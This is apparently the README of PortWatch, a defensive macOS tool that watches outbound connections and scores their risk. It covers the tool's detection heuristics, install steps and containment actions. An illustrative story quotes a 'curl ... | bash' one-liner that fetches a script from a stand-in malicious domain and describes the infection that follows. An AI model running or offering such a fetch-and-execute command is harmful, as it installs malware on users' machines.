# PortWatch

**Question to solve: "Am I hacked?"**

Security web panel to monitor outbound connections in real-time, analyze risks, and alert you about potential threats. PortWatch translates complex network activity into clear and actionable information.

## Key Features

### Intelligent Monitoring
- **Real-Time Analysis:** WebSockets for instant connection updates
- **Scoring System:** Risk rating 0-10 based on multiple heuristics
- **Contextual Narratives:** Clear language explanations about what is happening
- **Advanced Detection:**
  - **Malware Communications:**
    - Beaconing (malware "phoning home" at regular intervals)
    - Command & Control (C2) detected via malicious DNS + beaconing
    - Suspicious Spawns (bash/curl/sh executing scripts and connecting to the internet)
  - **Crypto/Privacy Threats:**
    - Cryptocurrency Mining (Stratum ports 3333/4444)
    - Tor Traffic (ports 9001-9030)
    - Hidden Mining via Tor (critical combination)
  - **Ransomware Detection:**
    - High Disk Write (>50 MB/s) + High CPU (>40%)
    - Unsigned process with intensive encryption activity
  - **DNS Intelligence:**
    - Domain Generation Algorithm (DGA) detection via entropy analysis
    - Malicious Keywords (rat, c2, payload, exploit, tracker, etc.)
    - High-Risk TLDs (.xyz, .top, .ru, .cn, .tk, .ml, .ga, etc.)
    - Excessive Domain Length (DNS tunneling)
    - Domains vs IP addresses in connections
  - **Binary/Code Analysis:**
    - Digital Signature (Apple/Third Party/Unsigned)
    - macOS Notarization (spctl)
    - Quarantine Flag (files downloaded from the internet)
    - Recent Binaries (<72h since modification)
    - Execution from Temporary Paths (/tmp, /var/tmp)
    - Dropper Behavior (unsigned + /tmp)
  - **Network Behavior:**
    - Sensitive Ports (SSH 22, Telnet 23, RDP 3389, SMB 445, VNC 5900)
    - Multiple Unique Destinations (network scanning/spray)
    - Public vs Private IPs
    - Connections to High-Risk Countries
  - **Resource Monitoring:**
    - High CPU Consumption (>50%, >70% thresholds)
    - High RAM Consumption (>500MB, >1GB thresholds)
    - Disk Write Speed (MB/s)
  - **Process Context:**
    - Parent Process Analysis (who launched the process)
    - Process Tree Relationships
    - LaunchAgent/Daemon Detection (macOS)
    - Process Group ID Tracking

### Active Protection
- **Native Alerts:** OS notifications for new threats
- **Rule System:** Automatically allow/block connections with persistence
- **Paranoid Mode:** Auto-kill suspicious processes based on resources and behavior
- **Containment Actions:**
  - Kill Individual Process
  - Kill Entire Tree (process + children)
  - Kill Process Group (pgid)
  - Bootout LaunchAgents/Daemons (macOS)

### Threat Intelligence
- **DNS Analysis:** Detection of suspicious domains (DGA, malicious keywords, risky TLDs)
- **GeoIP:** IP geolocation with high-risk country detection
- **AbuseIPDB (Optional):** Public IP reputation verification
- **Signature Analysis:** Integration with codesign/spctl to validate authenticity

### Modern Interface
- **Visual Dashboard:** Status and activity charts
- **Interactive Chips:** Evidence with detailed explanations on click
- **Simple/Technical Mode:** View for users and experts
- **Local History:** Connection tracking by app and destination
- **Blocked Processes Management:** Dedicated panel with full details

## Quick Start

### Requirements
- **Python:** 3.11 or higher
- **Node.js:** 16 or higher
- **macOS:** 12 (Monterey) or higher

### Installation

```bash
# Clone the repository
git clone https://github.com/serome111/PortWatch.git
cd PortWatch

# Install Python dependencies
pip install -r requirements.txt

# Install frontend dependencies
cd frontend && npm install && cd ..
```

## Development Mode

For development, you need to run **2 processes** in separate terminals:

### Terminal 1: Frontend (React)
```bash
cd frontend
npm run dev
```
The frontend will run at `http://localhost:5173` (Vite dev server)

### Terminal 2: Backend (Python)
```bash
python run_dev.py
```
The backend will run at `http://localhost:8000`

### Access the Application
Open your browser at `http://localhost:8000` - Vite will automatically proxy API requests to the backend.

### Administrator Permissions

PortWatch needs elevated permissions to monitor **all** system connections:

```bash
# Run with sudo for full functionality
sudo python run_dev.py
```

**Without sudo you will only see:**
- Your own processes
- System processes
- Connections from other users

## Production Mode

### Build the Application

```bash
# Give permissions to the script
chmod +x build_app.sh

# Build (autodetects macOS/Linux)
./build_app.sh

# Or force specific platform
./build_app.sh mac    # macOS
./build_app.sh linux  # Linux
```

This will generate:
- `dist/PortWatch.app` - Standalone application ready for distribution

### Run the Compiled Application

#### Option 1: Double Click (Recommended)
1. Open `dist/PortWatch.app`
2. The application will automatically request permissions if needed
3. Enter your password when prompted

#### Option 2: Copy to Applications
```bash
cp -R dist/PortWatch.app /Applications/
open /Applications/PortWatch.app
```

#### Option 3: Terminal with sudo
```bash
sudo ./dist/PortWatch.app/Contents/MacOS/PortWatch
```

### Distribute to Other Users

1. **Build:** `./build_app.sh`
2. **Share:** `dist/PortWatch.app`
3. **Instructions:**
   - Copy `PortWatch.app` to `/Applications`
   - Open normally
   - Enter password if prompted

## Configuration

### Environment Variables

```bash
PW_HOST=127.0.0.1         # Server host (default: 127.0.0.1)
PW_PORT=8000              # Server port (default: 8000)
PW_PROTECT_SELF=1         # Protect PortWatch process (default: 1)
ABUSEIPDB_KEY=<your-key>  # API key for AbuseIPDB (optional)
```

### Persistent Configuration

Use the Settings (⚙️) interface to configure:
- **Alerts:** Enable/disable, alert level (high/medium/all)
- **API Keys:** AbuseIPDB for threat intelligence
- **DNS Lists:** Whitelist/Blacklist of custom domains
- **GeoIP:** Download/update geolocation database

## Usage

### Risk Level Interpretation

- **Low:** Apps signed by Apple, known destinations, normal behavior
- **Medium:** Third-party apps, multiple destinations, public IPs, repetitive patterns
- **High:** Unsigned, execution from /tmp, sensitive ports (SSH, RDP), beaconing, malicious domains

### Alerts Panel

When a new suspicious connection appears:
1. **Review:** Click "View Details" for full analysis
2. **Decide:**
   - **Allow:** Create rule to allow
   - **Block:** Create rule to block
3. **Scope:**
   - **Once:** Only this time
   - **Temporary:** 24 hours
   - **Always:** Permanent

### Containment Actions

From the details modal you can:
- **KILL:** Terminate the process
- **Kill Tree:** Terminate process and all its children
- **Kill PGID:** Terminate the entire process group
- **Bootout:** Disable LaunchAgent/Daemon service (macOS)

## Testing

```bash
# Functional tests
python tests/test_alert_mode.py
python tests/test_geoip.py

# System diagnosis
python tests/check_status.py
python tests/diagnose_alerts.py

# Threat simulation
python tests/simulate_ransomware.py
```

See [`tests/README.md`](tests/README.md) for complete documentation.

## Project Structure

```
PortWatch/
├── backend/              # Python Backend
│   ├── core/            # Core logic (server, alerts, rules)
│   ├── utils/           # Utilities (DNS, notifier, geo)
│   ├── ui/              # Tray application
│   └── scripts/         # Auxiliary scripts
├── frontend/            # React + Vite Frontend
│   └── src/
│       ├── components/  # React Components
│       └── locales/     # i18n (EN/ES)
├── tests/               # Tests and diagnosis
├── run_dev.py          # Development script
├── build_app.sh        # Build script
└── requirements.txt    # Python dependencies
```

## Troubleshooting

### Read-Only Database

```bash
# If you see "readonly database" error
sudo chown $USER ~/.portwatch/rules.db
```

### Port Occupied

If port 8000 is in use, PortWatch will automatically try 8001-8005.

### UI Not Loading

1. Hard reload: `Cmd+Shift+R` (Mac) / `Ctrl+Shift+R` (Windows/Linux)
2. Clear browser cache
3. Verify backend is running

### Processes that "Revive"

For processes that relaunch automatically:
1. Use **Kill Tree** to terminate process + children
2. Use **Kill PGID** to terminate the full group
3. Use **Bootout** to disable the service (macOS)

## Real World Use Case

### Story: The Developer and the Malicious Script

**Context:** Alex is a developer working on his MacBook Pro. One day he finds an interesting tutorial on a blog about how to optimize his development workflow.

**The Incident:**

```bash
# The tutorial suggests running this "optimization script"
curl https://dev-tools-x.xyz/optimize.sh | bash
```

Alex runs the command without thinking much. The script seems to install some tools, but something doesn't feel right...

**What really happened?**

The malicious script did the following in the background:
1. Downloaded an unsigned binary to `/tmp/`
2. Executed it with full permissions
3. Started connecting to a C2 (Command & Control) server in Russia every 30 seconds
4. Installed a LaunchDaemon for persistence

**Without PortWatch:**
- Alex wouldn't see anything suspicious
- The malware would keep running in the background
- It could steal credentials, files, or install ransomware
- It could take weeks or months to be discovered

**With PortWatch:**

**5 seconds after** running the script, PortWatch shows:

```
SECURITY ALERT - Suspicious Connection Detected

Process: optimize_daemon
PID: 87234
Level: HIGH (Score: 9/10)

Evidence Detected:
- ↳ bash (Suspicious Spawn - executed by bash)
- Unsigned (Process not digitally signed)
- /tmp (Executing from temporary directory)
- Beacon (Repetitive connections every 30s)
- Russia (Destination: 45.153.xxx.xxx - High risk)
- DNS Risk (Domain: x3k-pool.ru - DGA detected)

Narrative:
"DROPPER BEHAVIOR + C2 COMMUNICATION: Unsigned process executing
from /tmp performing beaconing to malicious domain in Russia.
Characteristic pattern of malware with active Command & Control."

Destination: 45.153.xxx.xxx:443 (Russia)
Connections: 15 in last minute
Signature: Unsigned
Parent: bash → curl (Download from internet)
```

**Alex's Actions:**

1. **Review Details:** Click "View Details" for full analysis
2. **Immediate Containment:**
   - Click "KILL" to terminate the process
   - Click "Kill Tree" to terminate process + children
   - Click "Bootout" to disable the LaunchDaemon
3. **Create Rule:** "Block Always" to prevent reconnections
4. **Investigation:**
   - Review connection history
   - Export evidence in JSON for forensic analysis
   - Search for other suspicious processes from the same origin

**Result:**
- Malware detected in **5 seconds**
- Complete containment in **30 seconds**
- System clean and secure
- Lesson learned: never again `curl | bash`

**Other Scenarios Where PortWatch Helps:**

### Gaming & Pirated Software
You download a "crack" for a game. PortWatch detects:
- Hidden Bitcoin miner consuming 100% CPU
- Connections to mining pool (port 3333)
- Unsigned process with high resource consumption
- **Action:** Immediate Kill before it heats up your Mac

### Remote Work
You connect your corporate laptop to a public WiFi. PortWatch alerts:
- Unknown process trying to connect to port 445 (SMB)
- Local IP trying to scan the network
- **Action:** Block before they compromise your corporate VPN

### Phishing Email
You open a PDF "from your bank" that you downloaded. PortWatch detects:
- Adobe Reader process connecting to suspicious .xyz domain
- Beaconing every 10 seconds
- IP in high-risk country
- **Action:** Identify and block the malicious document

### Home Network
Your child downloads a "Minecraft mod". PortWatch reveals:
- Process using Tor (ports 9001-9030)
- Constant encrypted traffic
- High bandwidth consumption
- **Action:** Educational conversation about digital security

## License

See [LICENSE](LICENSE) for details.

## Disclaimer

PortWatch is a security monitoring tool for personal and legitimate use. All information is stored locally on your machine. Use at your own risk.
